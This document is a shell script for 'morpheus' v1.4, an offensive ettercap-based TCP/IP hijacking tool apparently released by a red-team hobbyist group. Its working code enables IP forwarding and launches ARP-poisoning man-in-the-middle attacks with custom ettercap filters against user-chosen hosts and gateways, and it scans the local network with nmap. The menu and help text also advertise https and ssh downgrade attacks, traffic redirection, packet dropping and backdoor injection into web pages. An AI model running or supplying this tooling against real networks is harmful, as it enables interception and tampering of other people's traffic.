#!/bin/sh
###
# morpheus - automated ettercap TCP/IP Hijacking tool
# Author: pedr0 Ubuntu [r00t-3xp10it] version: 1.4
# Suspicious-Shell-Activity (SSA) RedTeam develop @2016
# codename: blue_dreams [ GPL licensed ]
###

###
# Resize terminal windows size befor running the tool (gnome terminal)
# Special thanks to h4x0r Milton@Barra for this little piece of heaven! :D
resize -s 32 86 > /dev/null
# inicio




# -----------------------------------
# Colorise shell Script output leters
# -----------------------------------
Colors() {
Escape="\033";
  white="${Escape}[0m";
  RedF="${Escape}[31m";
  GreenF="${Escape}[32m";
  YellowF="${Escape}[33m";
  BlueF="${Escape}[34m";
  CyanF="${Escape}[36m";
Reset="${Escape}[0m";
}



Colors;
# ---------------------
# check if user is root
# ---------------------
if [ $(id -u) != "0" ]; then
echo ${RedF}[☠]${white} we need to be root to run this script...${Reset};
echo ${RedF}[☠]${white} execute [ sudo ./venom.sh ] on terminal ${Reset};
exit
else
echo "root user" > /dev/null 2>&1
fi


apc=`which ettercap`
if [ "$?" -eq "0" ]; then
echo "ettercap found" > /dev/null 2>&1
else
echo ""
echo ${RedF}[☠]${white} ettercap '->' not found! ${Reset};
sleep 1
echo ${RedF}[☠]${white} This script requires ettercap to work! ${Reset};
echo ${RedF}[☠]${white} Please run: sudo apt-get install ettercap ${Reset};
echo ${RedF}[☠]${white} to install missing dependencies... ${Reset};
echo ""
exit
fi



npm=`which nmap`
if [ "$?" -eq "0" ]; then
echo "nmap found" > /dev/null 2>&1
else
echo ""
echo ${RedF}[☠]${white} nmap '->' not found! ${Reset};
sleep 1
echo ${RedF}[☠]${white} This script requires nmap to work! ${Reset};
echo ${RedF}[☠]${white} Please run: sudo apt-get install nmap ${Reset};
echo ${RedF}[☠]${white} to install missing dependencies... ${Reset};
echo ""
exit
fi


# ------------------------------------------
# pass arguments to script [ -h ]
# we can use: ./morpheus.sh -h for help menu
# ------------------------------------------
while getopts ":h" opt; do
  case $opt in
    h)
cat << !
---
-- Author: r00t-3xp10it | SSA RedTeam @2016
-- Supported: Linux Kali, Ubuntu, Mint, Parrot OS
-- Suspicious-Shell-Activity (SSA) RedTeam develop @2016
---

   morpheus.sh framework automates tcp/udp packet manipulation tasks by using
   ettercap filters to manipulate target http requests under MitM attacks
   replacing the http packet contents by our own contents befor sending the
   packet back to the host that have request for it (tcp/ip hijacking).

   morpheus ships with a collection of etter filters writen be me to acomplish
   various tasks: replacing images in webpages, replace text in webpages, inject
   payloads using html <form> tag, denial-of-service attack (drop packets from source)
   https/ssh downgrade attacks, redirect target browser traffic to another ip address
   and also gives you the ability to build/compile your filter from scratch and lunch
   it through morpheus framework.

!
   exit
    ;;
    \?)
      echo ${RedF}[x]${white} Invalid option:${RedF} -$OPTARG ${Reset}; >&2
      exit
    ;;
  esac
done




# ---------------------
# Variable declarations
# ---------------------
dtr=`date | awk '{print $4}'`        # grab current hour
V3R="1.4"                            # module version number
DiStR0=`awk '{print $1}' /etc/issue` # grab distribution -  Ubuntu or Kali
IPATH=`pwd`                          # grab morpheus.sh install path
PrompT=`cat $IPATH/settings | egrep -m 1 "PROMPT_DISPLAY" | cut -d '=' -f2` > /dev/null 2>&1
LoGs=`cat $IPATH/settings | egrep -m 1 "WRITE_LOGFILES" | cut -d '=' -f2` > /dev/null 2>&1
IpV=`cat $IPATH/settings | egrep -m 1 "USE_IPV6" | cut -d '=' -f2` > /dev/null 2>&1
Edns=`cat $IPATH/settings | egrep -m 1 "ETTER_DNS" | cut -d '=' -f2` > /dev/null 2>&1
Econ=`cat $IPATH/settings | egrep -m 1 "ETTER_CONF" | cut -d '=' -f2` > /dev/null 2>&1




# ---------------------------------------------
# grab Operative System distro to store IP addr
# output = Ubuntu OR Kali OR Parrot OR BackBox
# ---------------------------------------------
InT3R=`netstat -r | grep "default" | awk {'print $8'}` # grab interface in use
case $DiStR0 in
    Kali) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    Debian) IP=`ifconfig $InT3R | egrep -w "inet" | awk '{print $2}'`;;
    Ubuntu) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    Parrot) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    BackBox) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    elementary) IP=`ifconfig $InT3R | egrep -w "inet" | cut -d ':' -f2 | cut -d 'B' -f1`;;
    *) IP=`zenity --title="☠ Input your IP addr ☠" --text "example: 192.168.1.68" --entry --width 300`;;
  esac
clear

# config internal framework settings
ping -c 3 www.google.com | zenity --progress --pulsate --title "☠ MORPHEUS ☠" --text="Config internal framework settings..." --percentage=0 --auto-close --width 300 > /dev/null 2>&1






# -----------------
# START OF FUNTIONS
# -----------------
sh_stage1 () {
cat << !
---
-- This module builds exe-service payloads to be
-- deployed onto windows service control manager (SCM)
-- module: [home]/shell/aux/deploy_service_payload.rb
---
!
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS ☠" --text "Execute module?" --width 330) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo "good" > /dev/null 2>&1
else
  echo ${RedF}[x]${white} Abort${RedF}!${Reset};
  sleep 2
fi
}




sh_stage9 () {
cat << !
---
-- This module acts like a firewall reporting/blocking tcp/udp connection
-- made by ip addr inside local lan (manual) and auto compile/lunch filter.
---
!
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS ☠" --text "Execute this module?" --width 330) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter RHOST ☠" --text "example: $IP\nLeave blank to poison all local lan." --entry --width 300) > /dev/null 2>&1
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "example: 192.168.1.254\nLeave blank to poison all local lan." --entry --width 300) > /dev/null 2>&1

  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  cp $IPATH/filters/firewall.eft $IPATH/filters/firewall.bk > /dev/null 2>&1
  sleep 1
  echo ${BlueF}[☠]${white} Edit firewall.eft '(filter)'${RedF}!${Reset};  
  xterm -T "MORPHEUS - firewall filter" -geometry 115x36 -e "nano $IPATH/filters/firewall.eft"
  sleep 1

    # compiling firewall.eft to be used in ettercap
    echo ${BlueF}[☠]${white} Compiling firewall.eft${RedF}!${Reset};
    xterm -T "MORPHEUS - compiling" -geometry 100x30 -e "etterfilter $IPATH/filters/firewall.eft -o $IPATH/output/firewall.ef && sleep 3"
    sleep 1

    # port-forward
    echo "1" > /proc/sys/net/ipv4/ip_forward

      # run mitm+filter
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -F $IPATH/output/firewall.ef -M ARP /$rhost// /$gateway//
        else
        cd $IPATH/logs
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -F $IPATH/output/firewall.ef -L $IPATH/logs/firewall -M ARP /$rhost// /$gateway//
        cd $IPATH
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -F $IPATH/output/firewall.ef -M ARP /$rhost/ /$gateway/
        else
        cd $IPATH/logs
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -F $IPATH/output/firewall.ef -L $IPATH/logs/firewall -M ARP /$rhost/ /$gateway/
        cd $IPATH
        fi
      fi
    

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  mv $IPATH/filters/firewall.bk $IPATH/filters/firewall.eft > /dev/null 2>&1
  # port-forward
  echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2

else
  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
  sleep 2
fi
}




sh_stageW () {
cat << !
---
-- This module allow you to write your own filter.
-- morpheus presents a 'template' previous build for you to write
-- your own command logic and automate the compiling/lunch of the filter.
---
!
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS ☠" --text "Execute this module?" --width 330) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then

# get user input to build filter
echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
rhost=$(zenity --title="☠ Enter RHOST ☠" --text "example: $IP\nLeave blank to poison all local lan." --entry --width 300) > /dev/null 2>&1
gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "example: 192.168.1.254\nLeave blank to poison all local lan." --entry --width 300) > /dev/null 2>&1

  echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
  cp $IPATH/filters/skelleton.eft $IPATH/filters/skelleton.bk > /dev/null 2>&1
  sleep 1
  echo ${BlueF}[☠]${white} Edit skelleton '(filter)'${RedF}!${Reset};  
  xterm -T "MORPHEUS - skelleton filter" -geometry 115x36 -e "nano $IPATH/filters/skelleton.eft"
  sleep 1

    # compiling skelleton.eft to be used in ettercap
    echo ${BlueF}[☠]${white} Compiling skelleton${RedF}!${Reset};
    xterm -T "MORPHEUS - compiling" -geometry 100x30 -e "etterfilter $IPATH/filters/skelleton.eft -o $IPATH/output/skelleton.ef && sleep 3"
    sleep 1

    # port-forward
    echo "1" > /proc/sys/net/ipv4/ip_forward


      # run mitm+filter
      echo ${BlueF}[☠]${white} Running ARP poison + etter filter${RedF}!${Reset};
      echo ${YellowF}[☠]${white} Press [q] to quit ettercap framework${RedF}!${Reset};   
      sleep 2
      if [ "$IpV" = "ACTIVE" ]; then
        if [ "$LoGs" = "NO" ]; then
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -F $IPATH/output/skelleton.ef -M ARP /$rhost// /$gateway//
        else
        cd $IPATH/logs
        echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -F $IPATH/output/skelleton.ef -L $IPATH/logs/skelleton -M ARP /$rhost// /$gateway//
        cd $IPATH
        fi

      else

        if [ "$LoGs" = "YES" ]; then
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -F $IPATH/output/skelleton.ef -M ARP /$rhost/ /$gateway/
        else
        cd $IPATH/logs
        echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
        ettercap -T -q -i $InT3R -F $IPATH/output/skelleton.ef -L $IPATH/logs/skelleton -M ARP /$rhost/ /$gateway/
        cd $IPATH
        fi
      fi
    

  # clean up
  echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
  mv $IPATH/filters/skelleton.bk $IPATH/filters/skelleton.eft > /dev/null 2>&1
  # port-forward
  echo "0" > /proc/sys/net/ipv4/ip_forward
  sleep 2

else
  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
  sleep 2
fi
}




sh_stageS () {
cat << !
---
-- This module uses nmap framework to report live hosts (LAN)
---
!
sleep 2
# run module?
rUn=$(zenity --question --title="☠ MORPHEUS ☠" --text "Execute this module?" --width 330) > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
  echo ${BlueF}[☠]${white} Scanning Local Lan${RedF}! ${Reset};
  # grab ip range + scan with nmap + zenity display results
  IP_RANGE=`ip route | grep "kernel" | awk {'print $1'}`
  echo ${BlueF}[☠]${white} Ip Range${RedF}:${white}$IP_RANGE${RedF}! ${Reset};
  nmap -sn $IP_RANGE | grep "for" | awk {'print $3,$5,$6'} > $IPATH/logs/lan.mop
  cat $IPATH/logs/lan.mop | zenity --title "☠ LOCAL LAN REPORT ☠" --text-info --width 500 --height 400 > /dev/null 2>&1

    # cleanup
    echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
    rm $IPATH/logs/lan.mop > /dev/null 2>&1
    sleep 2

else
  echo ${RedF}[x]${white} Abort task${RedF}!${Reset};
  sleep 2
fi
}



sh_FAQ () {
echo ""
echo "[☠] stage 2 running..."
sleep 2
}

sh_exit () {
echo ${BlueF}[☠]${white} Exit morpheus '(blue_dream)' framework${RedF}! ${Reset};
sleep 2
clear
exit
}


Colors;
# -----------------------------
# MAIN MENU SHELLCODE GENERATOR
# -----------------------------
# Loop forever
while :
do
clear
echo ${BlueF}
cat << !
               - Automated Ettercap TCP/IP Hijacking Tool -
    ███╗   ███╗ ██████╗ ██████╗ ██████╗ ██╗  ██╗███████╗██╗   ██╗███████╗
    ████╗ ████║██╔═══██╗██╔══██╗██╔══██╗██║  ██║██╔════╝██║   ██║██╔════╝
    ██╔████╔██║██║   ██║██████╔╝██████╔╝███████║█████╗  ██║   ██║███████╗
    ██║╚██╔╝██║██║   ██║██╔══██╗██╔═══╝ ██╔══██║██╔══╝  ██║   ██║╚════██║
    ██║ ╚═╝ ██║╚██████╔╝██║  ██║██║     ██║  ██║███████╗╚██████╔╝███████║
    ╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚══════╝
    VERSION:$V3R DISTRO:$DiStR0 IP:$IP INTERFACE:$InT3R IPv6:$IpV

    +--------+----------------------------------------------------------+
    | OPTION |                DESCRIPTION(filters)                      |
    +--------+----------------------------------------------------------+
    |   1    -  Drop all packets from source ip addr (packet drop)      |
    |   2    -  Redirect browser traffic to another ip addr (domain)    |
    |   3    -  Replace website images (img src=http://another.png)     |
    |   4    -  Replace website text   (replace: a,e,i by f,h,k)        |
    |   5    -  https downgrade attack (replace: https y http)          |
    |   6    -  ssh downgrade attack   (replace: SSH-1.99 by SSH-1.51)  |
    |   7    -  Rotate website document 180 degrees (CSS3 injection)    |
    |   8    -  Inject backdoor into html request (executable.exe)      |
    |   9    -  firewall.eft report/block tcp/udp connections (manual)  |
    |                                                                   |
    |   W    -  Write your own filter and use morpheus to inject it     |
    |   S    -  Scan local lan for live hosts (Nmap framework)          |
    |   E    -  exit/close Morpheus tool                                |
    +-------------------------------------------------------------------+
                                                       SSA-RedTeam@2016_|
!
echo ${Reset};
echo ${BlueF}[☠]${white} tcp/udp hijacking tool${RedF}! ${Reset};
sleep 1
echo ${BlueF}[➽]${white} Chose Your Option[filter]${RedF}: ${Reset};
echo -n "$PrompT"
read choice
case $choice in
1) sh_stage1 ;;
9) sh_stage9 ;;
W) sh_stageW ;;
w) sh_stageW ;;
S) sh_stageS ;;
s) sh_stageS ;;
e) sh_exit ;;
E) sh_exit ;;
*) echo "\"$choice\": is not a valid Option"; sleep 2 ;;
esac
done

